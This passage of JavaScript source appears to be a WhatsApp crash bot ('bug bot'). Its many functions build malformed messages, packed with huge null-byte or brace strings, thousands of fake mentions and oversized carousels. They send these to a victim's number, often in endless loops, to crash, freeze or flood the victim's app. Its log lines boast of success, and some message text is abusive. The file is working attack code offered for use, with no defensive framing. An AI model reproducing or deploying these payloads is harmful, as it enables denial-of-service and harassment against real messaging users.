  }
}

async function Xinvisdad(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "X",
                    contentText:
                        "X",
                    footerText: "HALLO༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        
async function bufferdelayv2(sock, target) {
    console.log(`SUCCES SENDING DELAY HARD TO - ${target}`);
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
    
    while(true) {
        try {
            const warx = {
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(1045000),
                    version: 3,
                    entryPointConversionSource: "StatusMessage",
                },
                forwardingScore: 0,
                isForwarded: false,
                font: Math.floor(Math.random() * 9),
                background: `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")}`,
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([226,213,217,102,205,126,232,145,0,70,137,73,190,145,0,44,165,102,153,233,111,114,69,10,55,61,186,131,245,153,93,211]),
                    fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([182,141,235,167,91,254,75,254,190,229,25,16,78,48,98,117,42,71,65,199,10,164,16,57,189,229,54,93,69,6,212,145]),
                    fileEncSha256: Buffer.from([29,27,247,158,114,50,140,73,40,108,77,206,2,12,84,131,54,42,63,11,46,208,136,131,224,87,18,220,254,211,83,153]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({length: 1900}, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        businessMessageForwardInfo: {businessOwnerJid: "0@s.whatsapp.net"}
                    }
                }
            };

            const msgcombo = {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {text: "Maklu Entod", format: "DEFAULT"},
                            nativeFlowResponseMessage: {name: "galaxy_message", paramsJson: "\u0000".repeat(145000), version: 3},
                            contextInfo: {
                                mentionedJid: Array.from({length: 1950}, () => "1" + Math.floor(Math.random() * 5000000) + "91@s.whatsapp.net"),
                                isForwarded: true,
                                forwardingScore: 999,
                                forwardedNewsletterMessageInfo: {newsletterJid: "1@newsletter", serverMessageId: 1, newsletterName: "Message"}
                            }
                        }
                    }
                }
            };

            const spraydelay = {
                viewOnceMessage: {
                    message: {
                        contactMessage: {
                            displayName: "\u0000".repeat(50000) + "IZIN LEWAT MASS".repeat(50000),
                            vcard: ``,
                            contextInfo: {
                                mentionedJid: Array.from({length: 2000}, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                                isSampled: true,
                                participant: target,
                                remoteJid: "status@broadcast",
                                forwardingScore: 9999,
                                isForwarded: true
                            }
                        }
                    }
                }
            };

            const addressFlowStatus = {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: { text: "— Zephyrinē E'scanor", format: "DEFAULT" },
                            nativeFlowResponseMessage: {
                                name: "address_message",
                                paramsJson: "\x10".repeat(1045000),
                                version: 3,
                            },
                        },
                    },
                },
            };

            const callPermissionStatus = {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: { text: "— Xwar Gacor", format: "DEFAULT" },
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\x10".repeat(1045000),
                                version: 3,
                            },
                        },
                    },
                },
            };

            const relaying = {
                messageId: undefined,
                statusJidList: [target],
                additionalNodes: [{
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{tag: "to", attrs: {jid: target}, content: []}]
                    }]
                }]
            };

            for (let i = 0; i < 75; i++) {
                const msg = generateWAMessageFromContent(target, {
                    ...warx,
                    contextInfo: {
                        ...warx.contextInfo,
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["0@s.whatsapp.net", ...Array.from({length: 1900}, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)]
                    }
                }, {});

                await Promise.all([
                    sock.relayMessage("status@broadcast", msg.message, {...relaying, messageId: msg.key.id}),
                    sock.relayMessage("status@broadcast", msgcombo, relaying),
                    sock.relayMessage("status@broadcast", addressFlowStatus, relaying),
                    sock.relayMessage("status@broadcast", callPermissionStatus, relaying)
                ]);

                for (let j = 0; j < 10; j++) {
                    await sock.relayMessage("status@broadcast", spraydelay, relaying);
                }

                await delay(100);
            }
            
            await delay(500);
            
        } catch (error) {
            console.error("Error in functiony loop:", error.message);
            await delay(1000);
        }
    }
}

async function delaymention(sock, target, mention) {
  const permissionStatusMsg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "— Zephyrinē E'scanor",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "0"),
    }
  );

  const stickerMediaList = [
    {
      id: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      bufferKey: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      id: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      bufferKey: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      fileEncSha256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mediaKey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ];

  let mediaIndex = 0;

  const selectedMedia = stickerMediaList[mediaIndex];
  mediaIndex = (mediaIndex + 1) % stickerMediaList.length;

  const {
    id,
    uri,
    bufferKey,
    sid,
    fileSha256,
    fileEncSha256,
    mediaKey,
  } = selectedMedia;

  const mentionContext = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () =>
        `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
      ),
    ],
  };

  const animatedStickerStatus = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${bufferKey}=${id}&_nc_sid=${sid}&mms3=true`,
          fileSha256,
          fileEncSha256,
          mediaKey,
          mimetype: "image/webp",
          isAnimated: true,
          contextInfo: mentionContext,
        },
      },
    },
  };

  const addressFlowStatus = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "— Ovalium Ghost Is Here", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
        },
      },
    },
  };

  const callPermissionStatus = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "— Xwarrxxx", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
        },
      },
    },
  };

  const statusPayloads = [
    animatedStickerStatus,
    callPermissionStatus,
    addressFlowStatus,
  ];

  const massiveTextStatus = generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "— Ovalium Ghost" + "ꦾ".repeat(50000),
      },
    },
    {}
  );

  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast", permissionStatusMsg.message, {
      messageId: permissionStatusMsg.key.id,
      statusJidList: [target],
    });

    for (const payload of statusPayloads) {
      const generatedMsg = generateWAMessageFromContent(target, payload, {});
      await sock.relayMessage("status@broadcast", generatedMsg.message, {
        messageId: generatedMsg.key.id,
        statusJidList: [target],
      });
    }

    await sock.relayMessage("status@broadcast", massiveTextStatus.message, {
      messageId: massiveTextStatus.key.id,
      statusJidList: [target],
    });

    if (i < 9) await new Promise(r => setTimeout(r, 5000));
  }

  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: massiveTextStatus.key,
            type: 25,
          },
        },
      },
    });
  }
}

async function ZInvisF(target) {
    while (true) {
        const msg = generateWAMessageFromContent(
            target,
            {
                ephemeralMessage: {
                    message: {
                        sendPaymentMessage: {
                            noteMessage: {
                                extendedTextMessage: {
                                    text: null,
                                    matchedText: null,
                                    description: null,
                                    title: null,
                                    paymentLinkMetadata: {
                                        button: { displayText: "\x30" },
                                        header: { headerType: 1 },
                                        provider: { paramsJson: "{{{".repeat(500000) }
                                    }
                                }
                            }
                        }
                    }
                }
            },
            {}
        )

        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            { messageId: null, participant: { jid: target } }
        )
    }
    console.log(`SUCCES SEND SPAM FC TO ${target}`);
}

async function prikitiwcresh(target) {
  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
  
  while(true) {
    try {
      const msg1 = generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
          message: {
            extendedTextMessage: {
              text: "XWAR AMPAS".repeat(50000),
              paymentLinkMetadata: {
                button: { displayText: Buffer.alloc(100000, "A").toString() },
                header: { 
                  headerType: 999,
                  title: Buffer.alloc(100000, "B").toString(),
                  subtitle: Buffer.alloc(100000, "C").toString()
                },
                provider: {
                  paramsJson: JSON.stringify({
                    data: Array.from({length: 1000}, () => Buffer.alloc(10000, "X").toString())
                  })
                }
              },
              linkPreviewMetadata: {
                urlMetadata: { fbExperimentId: 999999 },
                videoContentUrl: "whatsapp://crash?" + Buffer.alloc(50000, "D").toString()
              }
            }
          }
        }
      }, { participant: { jid: target } });

      const msg2 = generateWAMessageFromContent(target, {
        extendedTextMessage: {
          text: "CRASH".repeat(20000),
          paymentLinkMetadata: {
            metadata: {
              deepLink: "whatsapp://" + Buffer.alloc(100000, "E").toString(),
              amount: { value: 9999999999999999, offset: 999999999 }
            },
            provider: {
              paramsJson: "{{{".repeat(500000)
            }
          }
        }
      }, { participant: { jid: target } });

      const msg3 = generateWAMessageFromContent(target, {
        viewOnceMessageV2: {
          message: {
            extendedTextMessage: {
              text: Buffer.alloc(200000, "F").toString(),
              paymentLinkMetadata: {
                button: { displayText: Buffer.alloc(150000, "G").toString() },
                header: {
                  headerType: 1,
                  title: Buffer.alloc(150000, "H").toString()
                }
              }
            }
          }
        }
      }, { participant: { jid: target } });

      const results = await Promise.all([
        sock.relayMessage(target, msg1.message, { messageId: msg1.key.id }),
        sock.relayMessage(target, msg2.message, { messageId: msg2.key.id }),
        sock.relayMessage(target, msg3.message, { messageId: msg3.key.id })
      ]);

      await delay(100);

      await Promise.all([
        sock.sendMessage(target, { delete: { remoteJid: target, fromMe: true, id: msg1.key.id } }),
        sock.sendMessage(target, { delete: { remoteJid: target, fromMe: true, id: msg2.key.id } }),
        sock.sendMessage(target, { delete: { remoteJid: target, fromMe: true, id: msg3.key.id } })
      ]);

      await delay(50);
      
    } catch (error) {
      await delay(100);
    }
  }
}

async function SqLSpamInvis(target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: "🦠⃰͡°͜͡•⃟Mati Lo ⿻ Fuck ✶ > 666",
            matchedText: "https://t.me/Xwarrxxx",
            description: " dnd ;) ",
            title: " is back?!! ",
            paymentLinkMetadata: {
              button: {
                displayText: "APA BANG",
              },
              header: {
                headerType: 1,
              },
              provider: {
                paramsJson: "{{{".repeat(100000),
              },
            },
            linkPreviewMetadata: {
              paymentLinkMetadata: {
                button: {
                  displayText: "  @Xwar",
                },
                header: {
                  headerType: 1,
                },
                provider: {
                  paramsJson: "{".repeat(10000),
                },
              },
              paymentLinkMetadata: {
                button: {
                  displayText: "  Fuck You",
                },
                header: {
                  headerType: 1,
                },
                provider: {
                  paramsJson: "{".repeat(10000),
                },
              },
              urlMetadata: {
                fbExperimentId: 999,
              },
              fbExperimentId: 888,
              linkMediaDuration: 555,
              socialMediaPostType: 1221,
              videoContentUrl:
                "https://wa.me/settings/linked_devices#,,ahh",
              videoContentCaption: " Awowkowkw Fc ",
            },
          },
        },
      },
    },
    { participant: { jid: target } },
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
    userJid: target,
  });
}

async function ExploitDelay(sock, target) {
  try {
    const generateBroadcastMsg = await generateWAMessageFromContent(
      "status@broadcast",
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "X", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      "status@broadcast",
      generateBroadcastMsg.message,
      {
        messageId: generateBroadcastMsg.key.id,
        statusJidList: [target]
      }
    );

    const viewOnceMsg = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(150000),
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from(
                { length: 1950 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "91@s.whatsapp.net"
              ),
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "Message"
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(
      "status@broadcast",
      viewOnceMsg,
      {
        messageId: generateBroadcastMsg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }
            ]
          }
        ]
      }
    );
  } catch (err) {}
  const Button = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " X ",
              mentionedJid: ["13135559098@s.whatsapp.net"]
            },
            body: {
              text: "X",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"X","address":"2.7205","tower_number":"507","city":"X","name":"X","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: Button.message
      }
    },
    {
      messageId: Button.key.id,
      participant: { jid: target }
    }
  );
  for (let i = 0; i < 1000; i++) {
    const push = [];
    const buttons = [];
    for (let i = 0; i < 5000; i++) {
      buttons.push({
        name: 'galaxy_message',
        buttonParamsJson: JSON.stringify({
          header: 'null',
          body: 'xxx',
          flow_action: 'navigate',
          flow_action_payload: {
            screen: 'FORM_SCREEN'
          },
          flow_cta: 'Grattler',
          flow_id: '1169834181134583',
          flow_message_version: '3',
          flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',
        }),
      });
    }

    for (let k = 0; k < 1000; k++) {
      push.push({
        body: { text: '𖣂᳟᪳' },
        footer: { text: '' },
        header: {
          title: 'X ',
          hasMediaAttachment: true,
          imageMessage: {
            url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc',
            mimetype: 'image/jpeg',
            fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
            fileLength: '591',
            height: 0,
            width: 0,
            mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
            fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
            directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc',
            mediaKeyTimestamp: '1721344123'
          },
        },
        nativeFlowMessage: { buttons },
      });
    }

    const synxtax = generateWAMessageFromContent(
      target,
      {
        interactiveMessage: {
          body: { text: '\u0000' },
          footer: { text: '‌᪳' },
          synxtaxMessage: { cards: push },
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: synxtax.message } },
      {
        messageId: synxtax.key.id,
        participant: { jid: target },
      }
    );
  }
}

async function XtravasInvis(sock, target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, y) => `1313555000${y + 1}@s.whatsapp.net`
          ),
        },
        body: { text: "X", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{"values":{"in_pin_code":"999999","building_name":"saosinx","landmark_area":"X","address":"Yd7","tower_number":"Y7d","city":"chindo","name":"d7y","phone_number":"999999999999","house_number":"xxx","floor_number":"xxx","state":"D | ${"\u0000".repeat(900000)}"}}`,
          version: 3,
        },
      },
    },
    { userJid: target }
  );

  await sock.relayMessage(
    {
      tag: "groupStatusMessageV2",
      attrs: {},
      content: [],
    },
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }],
            },
          ],
        },
      ],
    }
  );
  const push = [];
  const buttons = [];

  buttons.push({
    name: "galaxy_message",
    buttonParamsJson: JSON.stringify({
      header: "null",
      body: "xxx",
      flow_action: "navigate",
      flow_action_payload: { screen: "FORM_SCREEN" },
      flow_cta: "Grattler",
      flow_id: "1169834181134583",
      flow_message_version: "3",
      flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s",
    }),
  });

  push.push({
    body: { text: "𖣂᳟᪳" },
    footer: { text: "" },
    header: {
      title: "X ",
      hasMediaAttachment: true,
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
        mimetype: "image/jpeg",
        fileLength: "591",
        jpegThumbnail: Buffer.alloc(0),
      },
    },
    nativeFlowMessage: { buttons },
  });

  const carousel = generateWAMessageFromContent(
    target,
    {
      interactiveMessage: {
        body: { text: "\u0000\u0000\u0000\u0000" },
        footer: { text: "‌⤻᪳" },
        carouselMessage: { cards: push },
      },
    },
    { userJid: target }
  );

  await sock.relayMessage(
    {
      tag: "groupStatusMessageV2",
      attrs: {},
      content: [],
    },
    carousel.message,
    {
      messageId: carousel.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }],
            },
          ],
        },
      ],
    }
  );
}

async function audiodelay(sock, target) {
    console.log(`SUCCES SENDING DELAY HARD TO - ${target}`);
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
    const warx = {
        nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3,
            entryPointConversionSource: "StatusMessage",
        },
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")}`,
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: Buffer.from([226,213,217,102,205,126,232,145,0,70,137,73,190,145,0,44,165,102,153,233,111,114,69,10,55,61,186,131,245,153,93,211]),
            fileLength: 432722,
            seconds: 26,
            ptt: false,
            mediaKey: Buffer.from([182,141,235,167,91,254,75,254,190,229,25,16,78,48,98,117,42,71,65,199,10,164,16,57,189,229,54,93,69,6,212,145]),
            fileEncSha256: Buffer.from([29,27,247,158,114,50,140,73,40,108,77,206,2,12,84,131,54,42,63,11,46,208,136,131,224,87,18,220,254,211,83,153]),
            directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
            mediaKeyTimestamp: 1746275400,
            contextInfo: {
                mentionedJid: Array.from({length: 1900}, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`),
                isSampled: true,
                participant: target,
                remoteJid: "status@broadcast",
                forwardingScore: 9741,
                isForwarded: true,
                businessMessageForwardInfo: {businessOwnerJid: "0@s.whatsapp.net"}
            }
        }
    };

    const msgcombo = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {text: "Maklu Entod", format: "DEFAULT"},
                    nativeFlowResponseMessage: {name: "galaxy_message", paramsJson: "\u0000".repeat(145000), version: 3},
                    contextInfo: {
                        mentionedJid: Array.from({length: 1950}, () => "1" + Math.floor(Math.random() * 5000000) + "91@s.whatsapp.net"),
                        isForwarded: true,
                        forwardingScore: 999,
                        forwardedNewsletterMessageInfo: {newsletterJid: "1@newsletter", serverMessageId: 1, newsletterName: "Message"}
                    }
                }
            }
        }
    };

    const spraydelay = {
        viewOnceMessage: {
            message: {
                contactMessage: {
                    displayName: "\u0000".repeat(50000) + "IZIN LEWAT MASS".repeat(50000),
                    vcard: ``,
                    contextInfo: {
                        mentionedJid: Array.from({length: 2000}, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const relaying = {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{tag: "to", attrs: {jid: target}, content: []}]
            }]
        }]
    };

    for (let i = 0; i < 75; i++) {
        const msg = generateWAMessageFromContent(target, {
            ...warx,
            contextInfo: {
                ...warx.contextInfo,
                participant: "0@s.whatsapp.net",
                mentionedJid: ["0@s.whatsapp.net", ...Array.from({length: 1900}, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)]
            }
        }, {});

        await Promise.all([
            sock.relayMessage("status@broadcast", msg.message, {...relaying, messageId: msg.key.id}),
            sock.relayMessage("status@broadcast", msgcombo, relaying)
        ]);

        for (let j = 0; j < 10; j++) {
            await sock.relayMessage("status@broadcast", spraydelay, relaying);
        }

        await delay(100);
    }    
    
}

async function delayExecution(sock, target) {
   const message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Maklu Entod",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(145000),
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from(
                { length: 1950 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "91@s.whatsapp.net"
              ),
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "Message"
              }
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", message, {
      messageId: undefined,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
    
   for (let i = 0; i < 100; i++) {
    await sock.relayMessage("status@broadcast", {
    viewOnceMessage: {
      message: {
       contactMessage: {
         displayName: "\u0000".repeat(50000) + "HAI PARA KONTOLL".repeat(50000),
         vcard: ``,
         contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, () => 
            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          ),
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9999,
          isForwarded: true
         }
       }
      }
    }
   }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
       tag: "mentioned_users",
       attrs: {},
       content: [{ 
         tag: "to", 
         attrs: { jid: target }, 
         content: [] 
       }]
      }]
    }]
   });
  }
  await sleep(3000)
  console.log(`SUCCES SENDING DELAY NEW TO ${target}`);
}

async function crashspamfc(target) {
    await sock.relayMessage(target, {
            requestPaymentMessage: {}
      },  {
       participant: { jid: target },
       quoted: null,
       userJid: null
       }) 
     console.log(`Succes Sending Bug To ${target}`) 
}

async function NullCrash(target) {
        let msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            contextInfo: {
                                remoteJid: " dnd :) ",
                                participant: "13135559098@s.whatsapp.net",
                                mentionedJid: ["status@broadcast"],
                                isForwarded: true,
                                fromMe: false,
                                forwardingScore: 9,
                                expiration: 7205,
                             ephemeralSettingTimestamp: 2502,
                                disappearingMode: {
                                   initiator: "INITIATED_BY_OTHER",
                                    trigger: "ACCOUNT_SETTING"
                                },
                                quotedMessage: {
                                  paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: 7205
                                  }
                                }
                            },
                            body: {
                                text: "@Xwarrxxx🩸",
                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {
                                name: "address_message",
                                paramsJson: "\u0000".repeat(1000000),
                                version: 3
                            }
                        }
                    }
                }
            }, {});
        
  await sock.relayMessage(
    target,
    msg.message,
    {
      messageId: msg.key.id,
      participant: { jid: target }
    }
  );
}

async function LocaFreezHome(sock, target) {
   cosnole.log("Succes Send Freez Crash By Xwar");

   const msg = {
      viewOnceMessage: {
         message: {
            interactiveMessage: {
               header: {
                  locationMessage: {
                     degressLatitude: -0,
                     degressLongitude: 0,
                     documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                        fileLength: "999999999999",
                        pageCount: 1316134911,
                        fileLength: 9999999999,
                        height: 999999999,
                        mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                        fileName: "MynWha Hikamaru" + "ꦾ".repeat(60000),
                        fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                        directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1743848703",
                     }
                  }
               },
                  nativeFlowMessage: {
                     buttons: [{ name: "form_message", buttonParamsJson: "\ubbbb" }, { name: "cta_call", buttonParamsJson: "ꦾ".repeat(55000) }, { name: "relog_call_crash", buttonParamsJson: "\u0000".repeat(0000) }]
                  },
              expiredSecury: [{ userJid: target,
                           mentionedJid: target,
                           participant: target,
                           quoted: null
                        }],
                        messageContextInfo: {
                           deviceListMetadata: {},
                           deviceListMetadataVersion: 1,
                           deviceListMetadataType: "Sectural_private"
                        },
                        contextInfo: {
                           externalAdReply: {
